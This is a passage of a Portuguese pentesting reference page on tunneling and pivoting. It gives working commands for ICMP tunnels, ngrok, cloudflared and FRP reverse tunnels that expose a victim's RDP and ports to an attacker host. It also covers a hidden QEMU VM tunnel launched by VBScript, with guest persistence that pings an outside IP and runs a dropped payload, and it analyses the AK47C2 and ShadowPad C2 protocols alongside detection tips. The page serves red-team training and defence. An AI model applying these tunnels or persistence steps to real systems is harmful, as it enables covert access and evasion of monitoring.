Proxychains-ng intercepta conexões TCP vinculadas dinamicamente e não pode transportar UDP ou ICMP; o proxying de DNS é configurável, portanto inspecione o `proxychains.conf` instalado e o helper do resolver em vez de presumir um resolver público fixo. Scripts legados `proxyresolv` expõem `PROXY_DNS_SERVER` para escolher o resolver; use um resolver acessível a partir do pivot quando forem necessários nomes internos.<sup>[[34]](#references)[[35]](#references)</sup>

## Túneis em Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

O ator Storm-2603 criou um **C2 de canal duplo ("AK47C2")** que abusa *somente* do tráfego de saída **DNS** e **plain HTTP POST** – dois protocolos que raramente são bloqueados em redes corporativas.<sup>[[2]](#references)</sup>

1. **Modo DNS (AK47DNS)**
• Gera um SessionID aleatório de 5 caracteres (por exemplo, `H4T14`).
• Precede as *task requests* com `1` ou os *results* com `2` e concatena campos diferentes (flags, SessionID, nome do computador).
• Cada campo é **criptografado com XOR usando a chave ASCII `VHBD@H`**, codificado em hexadecimal e unido com pontos – terminando finalmente com o domínio controlado pelo atacante:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• As requisições usam `DnsQuery()` para registros **TXT** (e registros **MG** como fallback).
• Quando a resposta excede 0xFF bytes, o backdoor **fragmenta** os dados em partes de 63 bytes e insere os marcadores:
`s<SessionID>t<TOTAL>p<POS>` para que o servidor C2 possa reordená-las.

2. **Modo HTTP (AK47HTTP)**
• Cria um envelope JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• O blob inteiro recebe XOR com `VHBD@H` → é convertido para hexadecimal → e enviado no corpo de um **`POST /`** com o cabeçalho `Content-Type: text/plain`.
• A resposta segue a mesma codificação e o campo `cmd` é executado com `cmd.exe /c <command> 2>&1`.

Notas do Blue Team
• Procure **consultas TXT** incomuns cujo primeiro label seja um hexadecimal longo e que sempre terminem em um domínio raro.
• Uma chave XOR constante seguida por ASCII-hex é fácil de detectar com YARA: `6?56484244?484` (`VHBD@H` em hexadecimal).
• Para HTTP, sinalize corpos de requisições POST `text/plain` que sejam compostos apenas por hexadecimal e tenham um número par de bytes.

{{#note}}
O canal mantém cada label de subdomínio dentro do limite DNS de 63 octetos, mas a conformidade com o protocolo, por si só, não o torna furtivo; domínios raros, labels hexadecimais longos e o volume de consultas continuam sendo sinais de detecção.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## Tunelamento ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans documenta um túnel IPv4 sobre ICMP usando um dispositivo TUN e requisições de echo ICMP; a configuração requer privilégios suficientes para criar a interface.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Baixe-o aqui**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng transporta conexões TCP por ICMP e usa as opções `-p`, `-l`, `-r` e `-R` mostradas abaixo para o proxy, o listener local, o host de destino e a porta de destino.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) é um agente para disponibilizar serviços de rede locais online por meio de um túnel seguro; sua CLI documenta endpoints HTTP, TCP e file URL, e o hostname do endpoint exibido pode variar conforme o endpoint e a conta.<sup>[[39]](#references)</sup>

### Instalação

- Crie uma conta: https://ngrok.com/signup
- Download do cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_O agente também oferece suporte a opções de autenticação e TLS quando necessário.<sup>[[39]](#references)</sup>_

#### Tunelamento TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Expondo arquivos com HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Útil para XSS,SSRF,SSTI ..._\
O agente standalone expõe sua interface de inspeção HTTP em `http://127.0.0.1:4040` por padrão; a interface é para tráfego HTTP.<sup>[[40]](#references)</sup>

#### Tunneling internal HTTP service

A opção `--host-header=rewrite` reescreve o cabeçalho HTTP `Host` upstream para corresponder ao serviço local.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### exemplo de configuração simples do ngrok.yaml

Isso usa o ngrok Agent Config v2; named tunnels usam `proto` e `addr` e são iniciados com `ngrok start`.<sup>[[42]](#references)</sup> Ele abre 3 túneis:

- 2 TCP
- 1 HTTP com exposição de arquivos estáticos de /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

O conector `cloudflared` do Cloudflare Tunnel estabelece conexões de saída; as aplicações publicadas podem encaminhar HTTP, HTTPS, TCP, SSH e RDP, enquanto os quick tunnels destinam-se ao desenvolvimento HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Comando de uma linha do quick tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Origem SOCKS5 (modo legado)

A flag legada `--socks5` informa ao `cloudflared` que a origem local usa SOCKS5; ela não cria um listener SOCKS5 local. Para um túnel gerenciado, `originRequest.proxyType: socks` configura o tratamento da origem SOCKS5.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Túneis persistentes com DNS

A configuração de túnel gerenciada localmente usa as chaves `tunnel`, `credentials-file` e `url` em letras minúsculas, conforme mostrado abaixo.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Inicie o conector:
```bash
cloudflared tunnel run mytunnel
```
O connector estabelece conexões de saída e, por padrão, negocia QUIC com fallback para HTTP/2; não presuma que toda implantação use TCP/443. Execute-o somente com os privilégios exigidos pela sua implantação.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) é um reverse proxy em Go compatível com **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX e XTCP**. O XTCP usa hole punching P2P, cujo sucesso depende do NAT. A partir da **v0.53.0**, ele pode atuar como um **SSH Tunnel Gateway**, permitindo que um host-alvo use o cliente OpenSSH padrão sem um binário `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Túnel TCP reverso clássico
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Usando o novo gateway SSH (sem o binário frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
O comando acima publica a porta **8080** da vítima como **attacker_ip:9000** usando o cliente OpenSSH padrão, enquanto o `frps` fornece o gateway.<sup>[[50]](#references)</sup>

## Tunnels baseados em VM furtivos com QEMU

A rede em modo de usuário do QEMU não requer privilégios de root ou de administrador para a rede virtual, e `-netdev user,hostfwd=...` redireciona conexões TCP, UDP ou UNIX do host para o guest.<sup>[[51]](#references)</sup> A TrustedSec documentou uma VM QEMU Tiny Core e uma tentativa de reverse SSH tunnel em um incidente no qual um EDR focado no host poderia não detectar atividades dentro do guest.<sup>[[1]](#references)</sup>

### One-liner rápido
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• O comando acima inicia um guest **Tiny Core Linux** com 256 MiB de memória e uma imagem de disco qcow2; a imagem de disco não é um disco em RAM.
• A porta **2222/tcp** no host Windows é encaminhada de forma transparente para **22/tcp** dentro do guest.
• Do ponto de vista do atacante, o alvo simplesmente expõe a porta 2222; quaisquer pacotes que cheguem até ela são tratados pelo servidor SSH em execução na VM.

### Iniciando discretamente por meio de VBScript

A TrustedSec observou inicializações do QEMU orientadas por VBS e imagens do Tiny Core no incidente citado acima.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Executar o script com `cscript.exe //B update.vbs` mantém a janela oculta.<sup>[[1]](#references)</sup>

### Persistência no guest

O incidente citado descreve a persistência no guest stateless Tiny Core por meio de `/opt/bootlocal.sh` e `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Solte o payload em `/opt/123.out`
2. Anexe ao `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Adicione `home/tc` e `opt` a `/opt/filetool.lst` para que o payload seja empacotado em `mydata.tgz` durante o desligamento.

### Considerações sobre telemetria

• O host ainda expõe o processo QEMU, a imagem qcow2 e qualquer listener encaminhado pelo host.
• Scans de processos executados apenas no host podem não inspecionar processos do guest, mas a virtualização não garante evasão; a telemetria de rede, QEMU e da imagem ainda pode expô-lo.<sup>[[1]](#references)[[51]](#references)</sup>

### Dicas para defensores

• Gere alertas para **binários QEMU/VirtualBox/KVM inesperados** em caminhos graváveis pelo usuário.
• Bloqueie conexões de saída originadas por `qemu-system*.exe`.
• Procure portas de escuta incomuns (2222, 10022, …) vinculadas imediatamente após o lançamento do QEMU.

## Nós de relay IIS/HTTP.sys via `HttpAddUrl` (ShadowPad)

A Check Point descreve o módulo IIS do ShadowPad como um mecanismo que transforma web servers de perímetro comprometidos em backdoors e nós de relay, vinculando prefixos de URL por meio de `HttpAddUrl`.<sup>[[3]](#references)</sup>

O mesmo relatório detalha os padrões de configuração, listeners wildcard, descriptografia de pacotes, filas de relay e telemetria de debug resumidos abaixo.<sup>[[3]](#references)</sup>

* **Padrões de configuração** – se a configuração JSON do módulo omitir valores, ele usará padrões plausíveis do IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Dessa forma, o tráfego benigno é respondido pelo IIS com o branding correto.
* **Interceptação wildcard** – os operadores fornecem uma lista de prefixos de URL separados por ponto e vírgula (wildcards no host + path). O módulo chama `HttpAddUrl` para cada entrada, fazendo com que o HTTP.sys encaminhe as requisições correspondentes ao handler malicioso; as requisições não correspondentes retornam ao comportamento normal do IIS.
* **Primeiro pacote criptografado** – os dois primeiros bytes do request body contêm a seed de um PRNG customizado de 32 bits. Cada byte subsequente passa por XOR com o keystream gerado antes da análise do protocolo:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Orquestração do relay** – o módulo mantém duas listas: “servers” (nós upstream) e “clients” (implants downstream). As entradas são removidas se nenhum heartbeat chegar em aproximadamente 30 segundos. Quando ambas as listas não estão vazias, ele combina o primeiro server saudável com o primeiro client saudável e simplesmente encaminha os bytes entre seus sockets até que um dos lados feche a conexão.
* **Telemetria de debug** – o logging opcional registra o IP de origem, o IP de destino e o total de bytes encaminhados para cada combinação. Os investigadores usaram essas evidências para reconstruir a malha do ShadowPad que abrangia várias vítimas.

---

## Outras ferramentas para verificar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Oculto nas sombras: túneis covert via virtualização QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Antes do ToolShell: explorando as operações anteriores de ransomware do Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: revelando a rede de relay e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README do Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Guia de referência do Nmap: contornando restrições de firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Manual do ssh do OpenBSD](https://man.openbsd.org/ssh)
- [7] [Manual do sshd_config do OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Notas de lançamento do OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README do sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting no Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Documentação do módulo socks_proxy do Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Documentação do módulo autoroute do Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README do reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README do Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Quickstart do Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners do Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost do Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README do rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Manual do socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Manual do PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Opções de linha de comando do PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Comando netsh interface portproxy da Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README do SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Documentação do Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Regras de Proxification do Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Manual do OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README do YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README do iodine](https://code.kryo.se/iodine/README.html)
- [32] [README do dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README do dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README do proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Nomes de domínio - implementação e especificação](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README do ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI do Agent do ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Interface de inspeção web do ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [virtual hosts do ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Configuração v2 do Agent do ngrok](https://ngrok.com/docs/agent/config/v2)
- [43] [Visão geral do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Parâmetros de origem do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Configuração do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Arquivo de configuração do Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Parâmetros de execução do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Conceitos do frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP do frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [SSH Tunnel Gateway do frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Documentação de rede do QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README do wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Repositório do código-fonte do NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: um Tailnet fronted por CDN a partir de um BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
{{#include ../banners/hacktricks-training.md}}
